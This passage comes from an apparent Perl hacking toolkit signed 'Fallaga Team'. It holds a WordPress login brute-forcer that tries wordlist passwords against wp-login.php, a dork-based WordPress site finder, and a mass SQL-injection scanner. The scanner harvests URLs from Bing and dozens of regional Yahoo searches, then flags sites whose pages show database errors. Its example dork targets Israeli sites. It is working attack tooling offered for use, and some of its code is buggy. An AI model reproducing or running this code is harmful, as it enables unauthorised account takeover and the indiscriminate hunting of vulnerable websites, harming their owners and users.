                         (__)\Wordpress)\/\
                             ||-----w |
  Fallaga Team  Here!!   ||      ||
\n ======================================================
 =======================================================\n";
chomp $target;

print "[+] Enter Wordpress Site: ";
chomp ($target = <STDIN>);
chomp $user;

print "[+] Enter Wordpress User: ";
chomp ($user = <STDIN>);
chomp $dork;

print "[+] Enter Wordlist: ";
chomp ($wordlist = <STDIN>);
if ($target !~ /^http:\/\//){
print q(
 Wordpress Bruteforce
 Contact me at : fallag.crx@mail.ru
 Fallaga Team  Here!!
);
$target = 'http://' . $target;
}
if ($target !~ /\/wp-login.php/){
$target = $target . '/wp-login.php';
}
$notpon = "\n[-] 404 wordlist not found!! \n";
open(a,"<$wordlist") or die "$notpon";
print "\nBruteforce info....
\nSite     : $target
\nUsername : $user
\nWordlist : Found!\n
[+] Bruteforce In Action....\n\n";
sleep(2);
while(<a>){
chomp($_);

my $response
= $ua->post($target,
{ log => $user,
pwd => $_,
$wpsub => 'Log in',
redirect_to => $redirect,
testcookie => '1'
});

my $code = $response->code;
print "[?] Testing $_.....\n";
if ($code == 403){
print "\n\n\t[-] Access Forbidden!!\n";
print "\t---==FAllaga Team Here==--- \n\n";
exit;
}
if($code == 302){
print "\n\n\t[*] PASSWORD FOUND: $_\n";
print "\t---==Fallaga Team Here==--- \n\n";
exit;
}
print "[-] Failed!!\n";
}
print "[-] Bruteforce failed!!
\n[!] Your wordlist is sucks!!\n";
exit;
}}
if($targett eq '13')
{
system('cls');
system('title Wordpress Site Finder');
                    {
use HTTP::Request;
use LWP::UserAgent;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);
use IO::Socket;
use Socket;
use POSIX qw(strftime);

if($^O =~ /Win/){
system("cls");
}else{
system("clear");
}

$dork = $ARGV[0];
my %hosts;
my $time =localtime();
print"
  WordPress Site finder
                         ^__^
                         (oo)\________
                         (__)\ Scan   )\/\
                             ||----w |
  Fallaga  Team Here!!   ||     ||
  perl $0 <dork> \n";
chomp $dork;

print "[+] Enter Wordpress Dork: ";
chomp ($dork = <STDIN>);
print q(
 WordPress site finder
 Contact me at : fallag.crx<at>mail.ru
 Fallaga Team Here!!
);
print "\n[!]Scanning info
[!]Localtime      : $time
[!]Scanning using : $dork
[!]Scanning started.....\n";
#Search Engine
	my @bing = &bing($dork);
print "\n[+] Get ".scalar(@bing)." Sites \n";
push(my @tot, @bing);
my @puliti=&unici(@tot);
print "\n[+] Find ".scalar(@tot)." Sites and Cleaned : ".scalar(@puliti)." for $dork \n";
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %30==0){
print "\n[?] Checking ".$contatore." of ".$uni. " Sites \n";
}
if ($contatore==$uni-1){
print "\n[!] Scan finish for $dork \n";
}
my $wp="http://".$sito;
my $req=HTTP::Request->new(GET=>$wp);
my $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12","Mozilla/5.0 (Windows; U; Windows NT 5.1; pl-PL; rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4","Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML,like Gecko) Chrome/9.1.0.0 Safari/540.0","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5","Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1","Opera/9.99 (Windows NT 5.1; U; pl) Presto/9.9.9","Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-HK) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5","Seamonkey-1.1.13-1(X11; U; GNU Fedora fc 10) Gecko/20081112","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; InfoPath.3");
$ua->timeout(10);
my $response=$ua->request($req);
#You can add the wordpress search here
if ($response->is_success) {
 if( $response->content =~ /Powered by WordPress/ ||
$response->content =~ /Site by WordPress/ ||
$response->content =~ /WordPress/ ||
$response->content =~ /wordpress/ ||
$response->content =~ /WORDPRESS/ ||
$response->content =~ /Theme by/ ||
$response->content =~ /Site Theme by/ ||
$response->content =~ /WordPress Theme by/ ||
$response->content =~ /Copyright Theme/ ||
$response->content =~ /Theme for WordPress/ ||
$response->content =~ /Blog pada WordPress.com/ ||
$response->content =~ /Blog at WordPress.com/ ||
$response->content =~ /The Morning After Theme/ ||
$response->content =~ /The Twenty Ten Theme/ ||
$response->content =~ /Proudly powered by WordPress/ ||
$response->content =~ /Plainbox Theme/ ||
$response->content =~ /Wordpress Theme/ ||
$response->content =~ /Modicus Remix Theme/ ||
$response->content =~ /Nishita Photo Blog Theme/ ||
$response->content =~ /Theme by MyThemeShop/ ||
$response->content =~ /Theme by/ ||
$response->content =~ /Futurosity Aperio Prototype/ ||
$response->content =~ /Get the Theme for Free/ ||
$response->content =~ /Brightness Theme/ ||
$response->content =~ /Noname Theme/ ||
$response->content =~ /Overstand Theme/ ||
$response->content =~ /Disire Portfolio/ ||
$response->content =~ /Delicacy Food/ ||
$response->content =~ /Diary Theme/ ||
$response->content =~ /Facebook Theme/ ||
$response->content =~ /NuBlue Theme/ ||
$response->content =~ /GreenLife Theme/ ||
$response->content =~ /JEEZ Business Theme/ ||
$response->content =~ /Favor HD Magazine Theme/ ||
$response->content =~ /Mason Jar Theme/ ||
$response->content =~ /Radion Theme/ ||
$response->content =~ /Clearly Theme/ ||
$response->content =~ /Kreativo Theme/ ||
$response->content =~ /My Baby Theme/ ||
$response->content =~ /Design Agency Theme/ ||
$response->content =~ /Isabelle Theme/ ||
$response->content =~ /Cotton Theme/ ||
$response->content =~ /ProjectFlow Theme/ ||
$response->content =~ /WordPress.com/ ||
$response->content =~ /Free Theme by/ ||
$response->content =~ /Paid Theme by/ ||
$response->content =~ /Get Free Theme/ ||
$response->content =~ /Get Paid Theme/ ||
$response->content =~ /Oleh WordPress/ ||
$response->content =~ /INDEX OF/ ||
$response->content =~ /Plugins WordPress/ ||
$response->content =~ /readme.html/ ||
$response->content =~ /WordPress version 3.3.1/ ||
$response->content =~ /WordPress version 3./ ||
$response->content =~ /WordPress site/ ||
$response->content =~ /Get Theme/ ||
$response->content =~ /Blog at Word/ ||
$response->content =~ /WordPress/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1","2","3","4","5","6","7","8","9","10"){
print "\n[+] Positive Wordpress site : $wp \n";
}}
elsif($re =~ /not found/ ||
$re =~ /404 NOT FOUND/ ||
$re =~ /Not Found/ ||
$re =~ /NOT FOUND/ ||
$re =~ /404/ ||
$re =~ /Error/ ||
$re =~ /error/ ||
$re =~ /ERROR/ ||
$re =~ /Page Not Found/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1","2","3","4","5","6","7","8","9","10"){
print "\n[-] Negative Wordpress site : $wp \n";
}}
}}
print "\n\t\t --==Fallaga Team Here==--\n";
exit;
#Sub Search Engine
################Bing
sub bing() {
    my @lst;
    my $key = $_[0];
    for (my $b=0; $b<=300; $b+=300) {
        my $go = ("http://www.bing.com/search?q=".&key($key)."&filt=all&first=".$b."&FORM=PERE");
        my $res = &query($go);
		if ($res =~ m/Ref A:/g && $res =~ m/Ref B:/g && $res =~ m/Ref C:/g) {$b=300;}
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            if ($1 !~ /bing\.com/) {
            my $k = $1;
                my @grep = &links($k);
                push(@lst,@grep);
            }
        }
    }
    return @lst;
}
################################################

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}
return @unici;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}
}}
if($targett eq '1x')
{
system('title About Me');
print "Creator : Fallag crx\n";
print "Mail : Fallag crx[at]mail[.]ru | Facebook ID : X.cripton.x \n";
print "Special Thanks to : Fallaga Team | x_spider_tn | Storm Shadow| HAnnibal-XYZ| TN Ghost | CollabTn| © Tn. White/Black  HAckers © \n";
system("pause");
}
if($targett eq '12')
{
system('cls');
system('title Sqli Scanner');
                    {
use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use Socket;
use URI::Escape;
use POSIX qw(strftime);

if ($^O =~ /Win/){
system ('cls');
}else{
system ('clear');
}
my ($sec,$min,$hour,$day,$mon,$year,$wday,$yday,$isdst)=localtime();
my $uagent    = "Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1";
print q {
 SQLi scanner
};
print q(
 SQLi scanner
);
print "---------------------------------------------------------
[!] Options
[!] example
[!] Dork : product.php?id= +site:il +you have an error in your sql
---------------------------------------------------------\n";
print "[?] Dork for scanning : ";
my $dork = <STDIN>;
chomp $dork;
$ngitung = 0;
my %hosts;
print "---------------------------------------------------------
[!] Scanning info
---------------------------------------------------------
[+] Time : $hour:$min:$sec
[+] Dork : $dork
---------------------------------------------------------
[!] Scanning started....
---------------------------------------------------------";
#Search Engine
my @bing = &bing($dork);
print "\n[+] Bing      get ".scalar(@bing)." Sites";
my @irlandia = &irlandia($dork);
print "\n[+] Irlanda  get ".scalar(@irlandia)." Sites";
my @indonesia = &indonesia($dork);
print "\n[+] Indonesia get ".scalar(@indonesia)." Sites";
my @thailand = &thailand($dork);
print "\n[+] Thailand  get ".scalar(@thailand)." Sites";
my @argentina = &argentina($dork);
print "\n[+] Argentina get ".scalar(@argentina)." Sites";
my @singapura = &singapura($dork);
print "\n[+] Singapura get ".scalar(@singapura)." Sites";
my @malaysia = &malaysia($dork);
print "\n[+] Malaysia  get ".scalar(@malaysia)." Sites";
my @vietnam = &vietnam($dork);
print "\n[+] Vietnam   get ".scalar(@vietnam)." Sites";
my @rusia = &rusia($dork);
print "\n[+] Russia    get ".scalar(@rusia)." Sites";
my @czech = &czech($dork);
print "\n[+] Czech     get ".scalar(@czech)." Sites";
my @belanda = &belanda($dork);
print "\n[+] Belanda   get ".scalar(@belanda)." Sites";
my @australia = &australia($dork);
print "\n[+] Australia get ".scalar(@australia)." Sites";
my @brasil = &brasil($dork);
print "\n[+] Brasil    get ".scalar(@brasil)." Sites";
my @kanada = &canada($dork);
print "\n[+] Canada    get ".scalar(@kanada)." Sites";
my @jerman = &jerman($dork);
print "\n[+] Germany   get ".scalar(@jerman)." Sites";
my @spanyol = &spanyol($dork);
print "\n[+] Spanyol   get ".scalar(@spanyol)." Sites";
my @perancis = &perancis($dork);
print "\n[+] Perancis  get ".scalar(@perancis)." Sites";
my @italia = &italia($dork);
print "\n[+] Talia     get ".scalar(@italia)." Sites";
my @inggris = &inggris($dork);
print "\n[+] Inggris   get ".scalar(@inggris)." Sites";
my @turki = &turki($dork);
print "\n[+] Turkiya   get ".scalar(@turki)." Sites";
my @polandia = &polandia($dork);
print "\n[+] Polandia  get ".scalar(@polandia)." Sites";
my @filipina = &filipina($dork);
print "\n[+] philipine get ".scalar(@filipina)." Sites";
my @peru = &peru($dork);
print "\n[+] Peru      get ".scalar(@peru)." Sites";
my @hongkong = &hongkong($dork);
print "\n[+] Hongkong  get ".scalar(@hongkong)." Sites";
my @finlandia = &finlandia($dork);
print "\n[+] Finlandia get ".scalar(@finlandia)." Sites";
my @yunani = &yunani($dork);
print "\n[+] Yunan     get ".scalar(@yunani)." Sites";
my @kolombia = &kolombia($dork);
print "\n[+] Colombia  get ".scalar(@kolombia)." Sites";
my @taiwan = &taiwan($dork);
print "\n[+] Taiwan    get ".scalar(@taiwan)." Sites";
my @swiss = &swiss($dork);
print "\n[+] Swiss     get ".scalar(@swiss)." Sites";
my @mexico = &mexico($dork);
print "\n[+] Meksiko   get ".scalar(@mexico)." Sites";
my @korea = &korea($dork);
print "\n[+] Korea     get ".scalar(@korea)." Sites";
my @india = &india($dork);
print "\n[+] India     get ".scalar(@india)." Sites";
my @swedia = &swedia($dork);
print "\n[+] Swedia    get ".scalar(@swedia)." Sites";
my @Uk = &Uk(dork);
print "\n[+] U.kingdom get ".scalar(@Uk)." Sites";
my @french = &Israel($dork);
print "\n[+] Israel    get ".scalar(@israel)." Sites";
my @french = &french($dork);
print "\n[+] french    get ".scalar(@french)." Sites";
my @Tunisia = &Tunisia($dork);
print "\n[+] Tunisia   get ".scalar(@Tunisia)." Sites";
print "\n---------------------------------------------------------";
print "\n[!] Searching vulnerable sites";
print "\n[!] Please wait...\n";
print "---------------------------------------------------------\n";
push(my @tot, @bing, @irlandia, @indonesia, @thailand, @argentina, @singapura, @malaysia, @vietnam, @swedia, @rusia, @czech, @belanda,
@australia, @brasil, @kanada, @jerman, @spanyol, @perancis, @italia, @inggris, @turki, @polandia, @filipina, @peru, @hongkong, @yunani,
@finlandia, @kolombia, @taiwan, @swiss, @mexico, @korea, @india, @irlandia,@Tunisia,@french,@israel,@Uk);
my @bersih=&clean(@tot);
my $akhir=scalar(@bersih);
foreach my $situs (@bersih) {
$ngitung++;
if ($ngitung==$akhir-1){
print "\n[!] Scan finish for $dork :D";
}
my $expl="http://".$situs."'";
my $mysql = "MySQL";
my $mssql = "MsSQL";
my $msacc = "MsAcces";
my $string = getcontent($expl);
if ( $string =~ m/You have an error in your SQL syntax/i || $string =~ m/Query failed/i || $string =~ m/SQL query failed/i ){
print "[*] MySQL vuln for SQLi on $situs\n";
printlog ("
Time     : $hour:$min:$sec
Site     : $situs
Database : $mysql\n");
}
elsif ( $string =~ m/ODBC SQL Server Driver/i || $string =~ m/Unclosed quotation mark/i || $string =~ m/Microsoft OLE DB Provider for/i ){
print "[*] MsSQL vuln for SQLi on $vuln\n";
printlog ("
Time     : $hour:$min:$sec
Site     : $situs
Database : $mssql\n");
}
elsif ( $string =~ m/Microsoft JET Database/i || $string =~ m/ODBC Microsoft Access Driver/i ){
print "[*] MsAcces vuln for SQLi on $vuln\n";
printlog ("
Time     : $hour:$min:$sec
Site     : $situs
Database : $msacc\n");
}
}
exit;
#Search Engine
sub bing() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=200; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&first=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
                        my $link = $1;
            if ($link !~ /google/) {
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub indonesia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://id.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub india() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://in.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub irlandia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://ie.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub korea() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://kr.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub thailand() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://th.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub argentina() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://ar.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub singapura() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://sg.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub malaysia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://malaysia.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub vietnam() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://vn.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub swedia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://se.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub rusia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://ru.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub czech() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://cs.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub belanda() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://nl.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub australia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://au.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub brasil() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://br.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub canada() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://ca.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub jerman() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://de.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub spanyol() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://es.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub perancis() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://fr.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
return @list;
}

sub italia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://it.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub turki() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://tr.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub polandia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://pl.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub filipina() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://ph.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub inggris() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://uk.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub peru() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://pe.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub hongkong() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://hk.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub yunani() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://gr.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub finlandia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://fi.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub kolombia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
